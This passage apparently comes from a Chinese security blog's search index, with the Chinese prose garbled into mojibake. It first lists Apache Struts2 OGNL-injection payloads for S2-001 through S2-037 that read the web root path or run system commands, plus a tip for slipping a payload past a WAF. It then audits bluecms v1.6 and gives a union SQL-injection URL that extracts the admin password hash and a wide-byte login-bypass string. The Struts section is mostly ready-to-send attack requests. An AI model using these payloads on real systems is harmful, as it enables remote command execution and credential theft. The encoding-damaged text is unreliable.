è¿›è¡Œè§£æï¼Œç„¶åé‡æ–°å¡«å……åˆ°å¯¹åº”çš„è¡¨å•æ•°æ®ä¸­ã€‚ä¾‹å¦‚æ³¨å†Œæˆ–ç™»å½•é¡µé¢ï¼Œæäº¤å¤±è´¥åç«¯ä¸€èˆ¬ä¼šé»˜è®¤è¿”å›ä¹‹å‰æäº¤çš„æ•°æ®ï¼Œç”±äºåç«¯ä½¿ç”¨ %{value} å¯¹æäº¤çš„æ•°æ®æ‰§è¡Œäº†ä¸€æ¬¡ OGNL è¡¨è¾¾å¼è§£æï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥æ„é€  Payload è¿›è¡Œå‘½ä»¤æ‰§è¡Œ ä¸Šæ–‡å¼•ç”¨rickgrayçš„æè¿°ã€‚ æ„é€ PoCè·å–tomcatæ‰§è¡Œè·¯å¾„1%&#123;&quot;tomcatBinDir&#123;&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;&#125;&quot;&#125; è·å–webæ ¹ç›®å½•1%&#123;#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(#req.getRealPath(&apos;/&apos;)),#response.flush(),#response.close()&#125; æ‰§è¡Œç³»ç»Ÿå‘½ä»¤1%&#123;#a=(new java.lang.ProcessBuilder(&quot;whoami&quot;)).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#matt.getWriter().println(new java.lang.String(#e)),#matt.getWriter().flush(),#matt.getWriter().close()&#125; Struts2 S2-005å½±å“ç‰ˆæœ¬: 2.0.0 - 2.1.8.1 æ¼æ´è¯¦æƒ…: http://struts.apache.org/docs/s2-005.html struts2æ¼æ´çš„èµ·æºæºäºS2-003(å—å½±å“ç‰ˆæœ¬: ä½äºStruts 2.0.12)ï¼Œstruts2ä¼šå°†httpçš„æ¯ä¸ªå‚æ•°åè§£æä¸ºonglè¯­å¥æ‰§è¡Œ(å¯ç†è§£ä¸ºjavaä»£ç )ã€‚onglè¡¨è¾¾å¼é€šè¿‡#æ¥è®¿é—®strutsçš„å¯¹è±¡ï¼Œstrutsæ¡†æ¶é€šè¿‡è¿‡æ»¤#å­—ç¬¦é˜²æ­¢å®‰å…¨é—®é¢˜ï¼Œç„¶è€Œé€šè¿‡unicodeç¼–ç (\\u0023)æˆ–8è¿›åˆ¶(\\43)å³ç»•è¿‡äº†å®‰å…¨é™åˆ¶ï¼Œå¯¹äºS2-003æ¼æ´ï¼Œå®˜æ–¹é€šè¿‡å¢åŠ å®‰å…¨é…ç½®(ç¦æ­¢é™æ€æ–¹æ³•è°ƒç”¨å’Œç±»æ–¹æ³•æ‰§è¡Œç­‰)æ¥ä¿®è¡¥ï¼Œä½†æ˜¯å®‰å…¨é…ç½®è¢«ç»•è¿‡å†æ¬¡å¯¼è‡´äº†æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨OGNLè¡¨è¾¾å¼è®²è¿™2ä¸ªé€‰é¡¹æ‰“å¼€ï¼ŒS2-003çš„ä¿®è¡¥æ–¹æ¡ˆæŠŠè‡ªå·±ä¸Šäº†ä¸€ä¸ªé”ï¼Œä½†æ˜¯æŠŠé”é’¥åŒ™ç»™æ’åœ¨äº†é”å¤´ä¸Š ä¸Šæ–‡å¼•ç”¨LittleHannçš„æè¿° æ„é€ PoCè·å–webæ ¹ç›®å½•1(&apos;\\43_memberAccess.allowStaticMethodAccess&apos;)(a)=true&amp;(b)((&apos;\\43context[\\&apos;xwork.MethodAccessor.denyMethodExecution\\&apos;]\\75false&apos;)(b))&amp;(&apos;\\43c&apos;)((&apos;\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET&apos;)(c))&amp;(g)((&apos;\\43req\\75@org.apache.struts2.ServletActionContext@getRequest()&apos;)(d))&amp;(i2)((&apos;\\43xman\\75@org.apache.struts2.ServletActionContext@getResponse()&apos;)(d))&amp;(i97)((&apos;\\43xman.getWriter().println(\\43req.getRealPath(%22\\u005c%22))&apos;)(d))&amp;(i99)((&apos;\\43xman.getWriter().close()&apos;)(d)) æ‰§è¡Œç³»ç»Ÿå‘½ä»¤1(&apos;\\43_memberAccess.allowStaticMethodAccess&apos;)(a)=true&amp;(b)((&apos;\\43context[\\&apos;xwork.MethodAccessor.denyMethodExecution\\&apos;]\\75false&apos;)(b))&amp;(&apos;\\43c&apos;)((&apos;\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET&apos;)(c))&amp;(g)((&apos;\\43mycmd\\75\\&apos;&quot;+cmd+&quot;\\&apos;&apos;)(d))&amp;(h)((&apos;\\43myret\\75@java.lang.Runtime@getRuntime().exec(\\43mycmd)&apos;)(d))&amp;(i)((&apos;\\43mydat\\75new\\40java.io.DataInputStream(\\43myret.getInputStream())&apos;)(d))&amp;(j)((&apos;\\43myres\\75new\\40byte[51020]&apos;)(d))&amp;(k)((&apos;\\43mydat.readFully(\\43myres)&apos;)(d))&amp;(l)((&apos;\\43mystr\\75new\\40java.lang.String(\\43myres)&apos;)(d))&amp;(m)((&apos;\\43myout\\75@org.apache.struts2.ServletActionContext@getResponse()&apos;)(d))&amp;(n)((&apos;\\43myout.getWriter().println(\\43mystr)&apos;)(d)) ä¸Šé¢2ä¸ªPoCæ‘˜è‡ªk8teamï¼Œä¸ºäº†å†™PoCï¼Œæœ‰æ‰€æ”¹åŠ¨ï¼Œä½†æ˜¯è¿™é‡Œå°±ä¸è´´ä¸Šæ¥äº†ï¼šï¼‰ Struts2 S2-009å½±å“ç‰ˆæœ¬: 2.0.0 - 2.3.1.1 æ¼æ´è¯¦æƒ…: https://struts.apache.org/docs/s2-009.html æ¼æ´åˆ©ç”¨ç‚¹è·ŸS2-003å’ŒS2-005ç±»ä¼¼ï¼Œåˆ©ç”¨OGNLè¡¨è¾¾å¼(1)(2),ä¼šæ‰§è¡Œ1çš„OGNLè¡¨è¾¾å¼ï¼Œ009æ„é€ äº†çš„æ–¹æ³•ä¸ºtest=(some OGNL è¡¨è¾¾å¼)(1)&amp;z[(test)(1)]=trueã€‚z[(test)(1)]=true,å¯¹struts2æ¥è¯´æ˜¯åˆæ³•çš„å‚æ•°ï¼Œä½†æ˜¯(test)(1)ä¼šæ‰§è¡Œä¸Šè¿°è¯´çš„æ–¹æ³•ï¼Œtestçš„å€¼è¢«å¸¦å…¥è®¡ç®—ï¼Œé€ æˆå‘½ä»¤æ‰§è¡Œã€‚ æ„é€ PoCå¼¹è®¡ç®—å™¨ps:å®éªŒç¯å¢ƒè¯•äº†å¥½å‡ æ¬¡éƒ½ä¸èƒ½æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œè·¯è¿‡çš„å¤§ä½¬æ±‚æŒ‡æ•™ï¼šï¼‰ 1person.name=(#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]= new java.lang.Boolean(false), #_memberAccess[&quot;allowStaticMethodAccess&quot;]= new java.lang.Boolean(true), @java.lang.Runtime@getRuntime().exec(&apos;open /Applications/Calculator.app&apos;))(meh)&amp;z[(person.name)(&apos;meh&apos;)]=true ç”¨çš„æ˜¯person/new-person.actionè¿™ä¸ªæ§åˆ¶å™¨ è·å–webæ ¹ç›®å½•1person.name=%28%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%20new%20java.lang.Boolean%28false%29%2C%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23req%3D@org.apache.struts2.ServletActionContext@getRequest%28%29%2C%23outstr%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23outstr.println%28%27webpath%3A%27%2b%23req.getRealPath%28%22%2f%22%29%29%2C%23outstr.close%28%29%29%28meh%29&amp;z%5B%28person.name%29%28%27meh%27%29%5D&quot; Struts2 S2-012å½±å“ç‰ˆæœ¬: 2.0.0 - 2.3.13 æ¼æ´è¯¦æƒ…: https://cwiki.apache.org/confluence/display/WW/S2-012 Action ä¸­ Result æ—¶ä½¿ç”¨äº†é‡å®šå‘ç±»å‹ï¼Œå¹¶ä¸”è¿˜ä½¿ç”¨ ${param_name} ä½œä¸ºé‡å®šå‘å˜é‡,strutsåœ¨è·å–å…¶å€¼æ—¶ä¼šæ‰§è¡ŒOGNLè¡¨è¾¾å¼ï¼Œä»è€Œé€ æˆå‘½ä»¤æ‰§è¡Œ æ„é€ PoCè·å–webæ ¹è·¯å¾„1%25%7B%28%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%29%28%23_memberAccess%5B%27allowStaticMethodAccess%27%5D%3Dtrue%29%28%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23response%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2C%23response.println%28%27webpath%3A%27%2b%23req.getSession%28%29.getServletContext%28%29.getRealPath%28%27%2f%27%29%29%2C%23response.flush%28%29%2C%23response.close%28%29%29%7D æ‰§è¡Œç³»ç»Ÿå‘½ä»¤1%25%7B%28%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%29%28%23_memberAccess%5B%27allowStaticMethodAccess%27%5D%3Dtrue%29%28%23a%3D%28new%20java.lang.ProcessBuilder%28%27whoami%27%29%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew%20java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew%20java.io.BufferedReader%28%23c%29%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read%28%23e%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%27dbapp%3A%27%2bnew%20java.lang.String%28%23e%29%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%29%7D%0A%0A Struts2 S2-013/S2-014å½±å“ç‰ˆæœ¬: 2.0.0 - 2.3.14.1 æ¼æ´è¯¦æƒ…: https://cwiki.apache.org/confluence/display/WW/S2-013,https://cwiki.apache.org/confluence/display/WW/S2-014 æ ‡ç­¾s:urlå’Œs:aä¸­æä¾›includeå‚æ•°ï¼Œå…¶å‚æ•°å€¼å¯ä»¥ä¸º none - include no parameters in the URL (default) get - include only GET parameters in the URL all - include both GET and POST parameters in the URL å¦‚æœå‚æ•°å€¼ä¸ºgetæˆ–allï¼Œåœ¨è·å–å¯¹åº”çš„å‚æ•°å€¼æ—¶æ‰§è¡Œäº†OGNLè¡¨è¾¾å¼ æ„é€ PoCè·å–webæ ¹ç›®å½•1a=$&#123;(%23_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23out.println(&apos;webpath%3a&apos;%2b%23req.getRealPath(&quot;/&quot;)),%23out.close())&#125; æ‰§è¡Œç³»ç»Ÿå‘½ä»¤1a=$&#123;(%23_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,%23a=@java.lang.Runtime@getRuntime().exec(&apos;&quot;+cmd+&quot;&apos;).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[50000],%23c.read(%23d),%23out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23out.println(&apos;dbapp%3a&apos;%2bnew java.lang.String(%23d)),%23out.close())&#125; Struts2 S2-016å½±å“ç‰ˆæœ¬: 2.0.0 - 2.3.15 æ¼æ´è¯¦æƒ…: https://struts.apache.org/docs/s2-016.html â€‹ DefaultActionMapper ç±»æ”¯æŒä»¥ action:ï¼Œredirect: å’Œ redirectAction: ä½œä¸ºè®¿é—®å‰ç¼€ï¼Œå‰ç¼€åé¢å¯ä»¥è·Ÿ OGNL è¡¨è¾¾å¼ï¼Œç”±äº Struts2 æœªå¯¹å…¶è¿›è¡Œè¿‡æ»¤ï¼Œå¯¼è‡´ä»»æ„ Action å¯ä»¥ä½¿ç”¨è¿™äº›å‰ç¼€æ‰§è¡Œä»»æ„ OGNL è¡¨è¾¾å¼ï¼Œä»è€Œå¯¼è‡´ä»»æ„å‘½ä»¤æ‰§è¡Œ ä¸Šæ–‡å¼•ç”¨rickgrayçš„æè¿°ã€‚ æ„é€ PoCè·å–webæ ¹ç›®å½•1?redirect:$&#123;#req=#context.get(&apos;co&apos;+&apos;m.open&apos;+&apos;symphony.xwo&apos;+&apos;rk2.disp&apos;+&apos;atcher.HttpSer&apos;+&apos;vletReq&apos;+&apos;uest&apos;),#resp=#context.get(&apos;co&apos;+&apos;m.open&apos;+&apos;symphony.xwo&apos;+&apos;rk2.disp&apos;+&apos;atcher.HttpSer&apos;+&apos;vletRes&apos;+&apos;ponse&apos;),#resp.setCharacterEncoding(&apos;UTF-8&apos;),#ot=#resp.getWriter (),#ot.print(&apos;web&apos;),#ot.print(&apos;path:&apos;),#ot.print(#req.getSession().getServletContext().getRealPath(&apos;/&apos;)),#ot.flush(),#ot.close()&#125; æ‰§è¡Œç³»ç»Ÿå‘½ä»¤1?redirect:$&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&apos;whoami&apos;&#125;)).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(&apos;co&apos;+&apos;m.ope&apos;+&apos;nsymph&apos;+&apos;ony.x&apos;+&apos;wor&apos;+&apos;k2.disp&apos;+&apos;atch&apos;+&apos;er.HttpSe&apos;+&apos;rvletRe&apos;+&apos;sponse&apos;),#matt.getWriter().println(new java.lang.String(#e)),#matt.getWriter().flush(),#matt.getWriter().close()&#125;&apos; è¿˜æœ‰ä¸€ç§æ¯”è¾ƒéšè”½çš„æ–¹æ³•ï¼Œå°†PoCæ”¾åœ¨æ–‡ä»¶ä¸Šä¼ çš„nameå¤„ï¼Œè¿‡wafã€‚ Struts2 S2-019å½±å“ç‰ˆæœ¬: 2.0.0 - 2.3.15.1 æ¼æ´è¯¦æƒ…: https://cwiki.apache.org/confluence/display/WW/S2-019 è¯¥æ¼æ´æˆå› ä¸ºå¼€å¯äº†å¼€å‘è€…æ¨¡å¼ï¼Œä¼ å…¥debug=command&amp;expression=å¯¼è‡´æ‰§è¡ŒOGNLè¡¨è¾¾å¼ï¼Œä»è€Œé€ æˆå‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚ æ„é€ PoCè·å–webæ ¹è·¯å¾„1debug=command&amp;expression=%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23resp%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23resp.setCharacterEncoding%28%27UTF-8%27%29%2C%23resp.getWriter%28%29.println%28%27webpath%3A%27%2b%23req.getSession%28%29.getServletContext%28%29.getRealPath%28%27%2f%27%29%29%2C%23resp.getWriter%28%29.flush%28%29%2C%23resp.getWriter%28%29.close%28%29 æ‰§è¡Œç³»ç»Ÿå‘½ä»¤1debug=command&amp;expression=%23a%3D%28new%20java.lang.ProcessBuilder%28%27whoami%27%29%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew%20java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew%20java.io.BufferedReader%28%23c%29%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read%28%23e%29%2C%23out%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23out.getWriter%28%29.println%28%27dbapp%3A%27%2bnew%20java.lang.String%28%23e%29%29%2C%23out.getWriter%28%29.flush%28%29%2C%23out.getWriter%28%29.close%28%29%0A Struts2 S2-032å½±å“ç‰ˆæœ¬: 2.3.20 - 2.3.28 (except 2.3.20.3 and 2.3.24.3) æ¼æ´è¯¦æƒ…: https://struts.apache.org/docs/s2-032.html åœ¨é…ç½®äº† Struts2 DMI ä¸º True çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥ä½¿ç”¨ method: Action å‰ç¼€å»è°ƒç”¨å£°æ˜ä¸º public çš„å‡½æ•°ï¼ŒDMI çš„ç›¸å…³ä½¿ç”¨æ–¹æ³•å¯å‚è€ƒå®˜æ–¹ä»‹ç»ï¼ˆDynamic Method Invocationï¼‰ï¼Œè¿™ä¸ª DMI çš„è°ƒç”¨ç‰¹æ€§å…¶å®ä¸€ç›´å­˜åœ¨ï¼Œåªä¸è¿‡åœ¨ä½ç‰ˆæœ¬ä¸­ Strtus2 ä¸ä¼šå¯¹ name æ–¹æ³•å€¼åš OGNL è®¡ç®—ï¼Œè€Œåœ¨é«˜ç‰ˆæœ¬ä¸­ä¼šï¼Œä»£ç è¯¦æƒ…å¯å‚è€ƒé˜¿å°”æ³•å®éªŒå®¤çš„æŠ¥å‘Š - ã€ŠApache Struts2 s2-032æŠ€æœ¯åˆ†æåŠæ¼æ´æ£€æµ‹è„šæœ¬ã€‹ ä¸Šæ–‡å¼•ç”¨rickgrayçš„æè¿°ã€‚ æ„é€ PoCè·å–webæ ¹ç›®å½•1?method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#req=#context.get(#parameters.a[0]),#resp=#context.get(#parameters.b[0]),#resp.setCharacterEncoding(#parameters.c[0]),#ot=#resp.getWriter (),#ot.print(#parameters.e[0]+#req.getSession().getServletContext().getRealPath(#parameters.d[0])),#ot.flush(),#ot.close&amp;a=com.opensymphony.xwork2.dispatcher.HttpServletRequest&amp;b=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;c=UTF-8&amp;d=/&amp;e=webpath: æ‰§è¡Œç³»ç»Ÿå‘½ä»¤1?method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#a=(new java.lang.ProcessBuilder(#parameters.a[0])).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(#parameters.b[0]),#matt.getWriter().println(#parameters.c[0]+new java.lang.String(#e)),#matt.getWriter().flush(),#matt.getWriter().close&amp;a=whoami&amp;b=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;c=flag: Struts2 S2-037å½±å“ç‰ˆæœ¬: 2.3.20 - 2.3.28.1 æ¼æ´è¯¦æƒ…: http://struts.apache.org/docs/s2-037.html è¿™ä¸ªæ¼æ´å’Œä¹‹å‰S2-032/033æ˜¯ä¸€ä¸ªåœ°æ–¹ï¼Œéƒ½æ˜¯åœ¨DefaultActionInvocation.javaçš„invokeActionæ–¹æ³•ä¸­æ²¡æœ‰å¯¹äºmethodNameå‚æ•°å†…å®¹è¿›è¡Œæ ¡éªŒï¼Œä¾¿ç›´æ¥ä¸¢åˆ°äº†getValueæ–¹æ³•é‡Œé¢ï¼Œä»è€Œé€ æˆOnglè¡¨è¾¾å¼çš„æ³¨å…¥ã€‚ ä¸Šæ–‡å¼•ç”¨nsfocus%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html)çš„æè¿° æ„é€ PoCè·å–webæ ¹ç›®å½•1/(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)?(#req=#context.get(#parameters.a[0]),#resp=#context.get(#parameters.b[0]),#resp.setCharacterEncoding(#parameters.c[0]),#ot=#resp.getWriter (),#ot.print(#parameters.e[0]+#req.getSession().getServletContext().getRealPath(#parameters.d[0])),#ot.flush(),#ot.close):xx.toString.json?&amp;a=com.opensymphony.xwork2.dispatcher.HttpServletRequest&amp;b=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;c=UTF-8&amp;d=/&amp;e=webpath: æ‰§è¡Œç³»ç»Ÿå‘½ä»¤1/(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)?(#a=(new java.lang.ProcessBuilder(#parameters.a[0])).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(#parameters.b[0]),#matt.getWriter().println(#parameters.c[0]+new java.lang.String(#e)),#matt.getWriter().flush(),#matt.getWriter().close()):xx.toString.json?&amp;a=whoami&amp;b=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;c=flag: æ€»ç»“Struts2å‘½ä»¤æ‰§è¡Œç®—æ˜¯ä¸€ä¸ªæ¯”è¾ƒç»å…¸çš„æ¼æ´äº†ï¼Œå¸Œæœ›ä»¥åæ·±å…¥javaçš„ä¸€äº›æ¡†æ¶ï¼Œå¯ä»¥ä»åº•å±‚æ¥åˆ†æï¼šï¼‰"},{"title":"bluecms v1.6 Sql Injection åˆ†æ","permalink":"http://blog.0kami.cn/2017/01/11/old-old-bluecms-v1-6-Sql-Injection/","text":"æ¦‚è¿°å¾ˆä¹…æ²¡æœ‰ä»£ç å®¡è®¡äº†ï¼Œæ‹¿ä¸€å¥—ç®€å•çš„æ‰¾æ‰¾æ„Ÿè§‰ã€‚bluecmsæ˜¯ä¸€å¥—æ¯”è¾ƒè€çš„é—¨æˆ·ç½‘ç«™cmsï¼Œç½‘ä¸Šä¹Ÿæœ‰å¾ˆå¤šå…³äºå®ƒçš„æ¼æ´è¿˜æœªä¿®è¡¥ï¼Œæ‰€ä»¥ä¸‹æ–‡çš„æ¼æ´ä¹Ÿä¸ç®—æ˜¯æœ€æ–°çš„ï¼Œä»…å½“æ˜¯ç»ƒç»ƒæ‰‹ã€‚ SQLæ³¨å…¥åˆ†æé¦–å…ˆå…³æ³¨ä¸€ä¸‹æ•°æ®çš„è¾“å…¥ å…¨å±€æ•°æ®è½¬ä¹‰åœ¨common.inc.phpä¸­ 1234567if(!get_magic_quotes_gpc())&#123; $_POST = deep_addslashes($_POST); $_GET = deep_addslashes($_GET); $_COOKIES = deep_addslashes($_COOKIES); $_REQUEST = deep_addslashes($_REQUEST);&#125; å†è·Ÿè¿›ä¸€ä¸‹deep_addslashes 123456789101112131415function deep_addslashes($str)&#123; if(is_array($str)) &#123; foreach($str as $key=&gt;$val) &#123; $str[$key] = deep_addslashes($val); &#125; &#125; else &#123; $str = addslashes($str); &#125; return $str;&#125; å¯ä»¥å‘ç°å¯¹æ•°æ®çš„æ³¨å…¥ï¼Œè¿›è¡Œäº†åŠ æ–œæ è½¬ä¹‰çš„æ“ä½œã€‚é‚£ä¹ˆæ¥ä¸‹æ¥æ‰¾æ³¨å…¥æ€è·¯ä¸»è¦æœ‰ä»¥ä¸‹3ç‚¹ï¼š æ‰¾æ•´æ•°å‹æ³¨å…¥ æ•´å¥—cmsé»˜è®¤gb2312ç¼–ç ï¼Œå®¹æ˜“é€ æˆå®½å­—èŠ‚æ³¨å…¥ httpå¤´å¹¶ä¸åœ¨è½¬ä¹‰çš„èŒƒå›´å†…ï¼Œæ‰€ä»¥ç±»ä¼¼å­˜å…¥ipï¼Œrefferçš„ä½ç½®ä¹Ÿèƒ½å‘ç”Ÿæ³¨å…¥ æ•´æ•°å‹æ³¨å…¥æ‹¿grepåŒ¹é…äº†ä¸€ä¸‹$_GETï¼Œæ‰¾åˆ°ä¸€å¤„ä¸åšå…¶ä»–è¿‡æ»¤çš„æ•´æ•°å‹ä½ç½® 1./ad_js.php:$ad_id = !empty($_GET[&apos;ad_id&apos;]) ? trim($_GET[&apos;ad_id&apos;]) : &apos;&apos;; è·Ÿè¿›ad_js.php 12345678$ad_id = !empty($_GET[&apos;ad_id&apos;]) ? trim($_GET[&apos;ad_id&apos;]) : &apos;&apos;;if(empty($ad_id))&#123; echo &apos;Error!&apos;; exit();&#125;$ad = $db-&gt;getone(&quot;SELECT * FROM &quot;.table(&apos;ad&apos;).&quot; WHERE ad_id =&quot;.$ad_id); getoneå‡½æ•° 12345function getone($sql, $type=MYSQL_ASSOC)&#123; $query = $this-&gt;query($sql,$this-&gt;linkid); $row = mysql_fetch_array($query, $type); return $row;&#125; å¯ä»¥çœ‹åˆ°è¿™é‡Œå¯¹ad_idæ²¡æœ‰åšå…¶ä»–è¿‡æ»¤å¤„ç†ï¼Œé€ æˆäº†æ•´æ•°å‹æ³¨å…¥,ç”±äºåé¢ä¼šå°†ad_contentæ‰“å°åœ¨é¡µé¢ä¸Šï¼Œæ‰€ä»¥ç›´æ¥ç”¨unionæ³¨å…¥å°±å¯ä»¥è·å¾—æ•°æ®ï¼Œæ„é€ payload 1/ad_js.php?ad_id=1%20union%20select%201,2,3,4,5,6,concat(admin_name,0x23,pwd)%20from%20blue_admin%20limit%201 ç»“æœå¯ä»¥åœ¨è¿”å›çš„ç•Œé¢ä¸­çœ‹åˆ° 123&lt;!--document.write(&quot;admin#21232f297a57a5a743894a0e4a801fc3&quot;);--&gt; ps:å› ä¸ºè¯¥cmsé”™è¯¯å›æ˜¾å…·ä½“sqlè¯­å¥ï¼Œè¡¨å‰ç¼€å¯ä»¥é€šè¿‡æŠ¥é”™çš„æ–¹æ³•æŠŠè¡¨å‰ç¼€çˆ†å‡ºæ¥ã€‚ å®½å­—èŠ‚æ³¨å…¥bluecmsæ“ä½œæ•°æ®åº“çš„å…·ä½“ç±»å®šä¹‰åœ¨mysql.class.php,é»˜è®¤è¿æ¥æ—¶çš„ç¼–ç ä¸ºgbkï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“å½“æ•°æ®åº“è¿æ¥æ—¶çš„ç¼–ç ä¸ºgbkç­‰åŒå­—èŠ‚ç¼–ç æ—¶ï¼Œå®¹æ˜“å‘ç”Ÿå®½å­—èŠ‚æ³¨å…¥ã€‚å‰é¢æåˆ°è¯¥å¥—cmså¯¹æ•°æ®è¾“å…¥è¿›è¡Œäº†è½¬ä¹‰çš„æ“ä½œï¼Œé‚£ä¹ˆåˆšåˆšå¥½æ¡ä»¶éƒ½é½äº†ï¼Œå¿…ç„¶å­˜åœ¨å®½å­—èŠ‚æ³¨å…¥ã€‚grepçœ‹äº†ä¸€ä¸‹ï¼ŒåŸºæœ¬ä¸Šçš„å­—ç¬¦ä¸²éƒ½åªæ˜¯åšäº†è½¬ä¹‰å¤„ç†ï¼Œæ‰€ä»¥å­—ç¬¦ä¸²æ•°æ®è¾“å…¥ç‚¹éƒ½å­˜åœ¨å®½å­—èŠ‚æ³¨å…¥ã€‚å¤§å¤šæ•°æ³¨å…¥éƒ½æ˜¯ç›²æ³¨ï¼Œæ²¡æ‰¾åˆ°å…·ä½“å¯ä»¥ä¼šæ˜¾æ•°æ®çš„åœ°æ–¹ï¼Œè¿™é‡Œå°±ç®€å•çœ‹ä¸€ä¸‹ç™»é™†å¤„ åå°ç™»å½•å¤„å…¶å®å‰å°user.phpï¼Œä¹Ÿå­˜åœ¨æ³¨å…¥ï¼Œåªæ˜¯ç›²æ³¨ï¼Œè¿™é‡Œå°±å–ç®€å•çš„åå°ç™»å½•éªŒè¯å¤„admin/login.php 12345678910111213141516171819202122elseif($act == &apos;do_login&apos;)&#123; $admin_name = isset($_POST[&apos;admin_name&apos;]) ? trim($_POST[&apos;admin_name&apos;]) : &apos;&apos;; $admin_pwd = isset($_POST[&apos;admin_pwd&apos;]) ? trim($_POST[&apos;admin_pwd&apos;]) : &apos;&apos;; $remember = isset($_POST) ? intval($_POST[&apos;rememberme&apos;]) : 0; if($admin_name == &apos;&apos;)&#123; showmsg(&apos;xxx&apos;); &#125; if($admin_pwd == &apos;&apos;)&#123; showmsg(&apos;xxx&apos;); &#125; if(check_admin($admin_name, $admin_pwd))&#123; update_admin_info($admin_name); if($remember == 1)&#123; setcookie(&apos;Blue[admin_id]&apos;, $_SESSION[&apos;admin_id&apos;], time()+86400); setcookie(&apos;Blue[admin_name]&apos;, $admin_name, time()+86400); setcookie(&apos;Blue[admin_pwd]&apos;, md5(md5($admin_pwd).$_CFG[&apos;cookie_hash&apos;]), time()+86400); &#125; &#125;else&#123; showmsg(&apos;xxx&apos;); &#125; showmsg(&apos;xxx&apos;, &apos;index.php&apos;); &#125; ç»§ç»­è·Ÿè¿›check_admin 12345678910111213function check_admin($name, $pwd)&#123; global $db; $row = $db-&gt;getone(&quot;SELECT COUNT(*) AS num FROM &quot;.table(&apos;admin&apos;).&quot; WHERE admin_name=&apos;$name&apos; and pwd = md5(&apos;$pwd&apos;)&quot;); if($row[&apos;num&apos;] &gt; 0) &#123; return true; &#125; else &#123; return false; &#125;&#125; å¯ä»¥çœ‹åˆ°è¿™é‡Œå‘ç”Ÿäº†ä¸€æ¬¡ç™»é™†éªŒè¯ï¼Œå¯ä»¥é€šè¿‡å®½å­—èŠ‚æ³¨å…¥æ¥åšä¸‡èƒ½å¯†ç ç™»é™†ã€‚ 1user_name=admin%65%27+or+1%3D1%23&amp;pwd=123 å­˜å…¥ipé€ æˆæ³¨å…¥åœ¨common.inc.phpä¸­å¯ä»¥æ‰¾åˆ°getip()å‡½æ•° 12345678910111213141516171819202122232425262728function getip()&#123; if (getenv(&apos;HTTP_CLIENT_IP&apos;)) &#123; $ip = getenv(&apos;HTTP_CLIENT_IP&apos;); &#125; elseif (getenv(&apos;HTTP_X_FORWARDED_FOR&apos;)) &#123; $ip = getenv(&apos;HTTP_X_FORWARDED_FOR&apos;); &#125; elseif (getenv(&apos;HTTP_X_FORWARDED&apos;)) &#123; $ip = getenv(&apos;HTTP_X_FORWARDED&apos;); &#125; elseif (getenv(&apos;HTTP_FORWARDED_FOR&apos;)) &#123; $ip = getenv(&apos;HTTP_FORWARDED_FOR&apos;); &#125; elseif (getenv(&apos;HTTP_FORWARDED&apos;)) &#123; $ip = 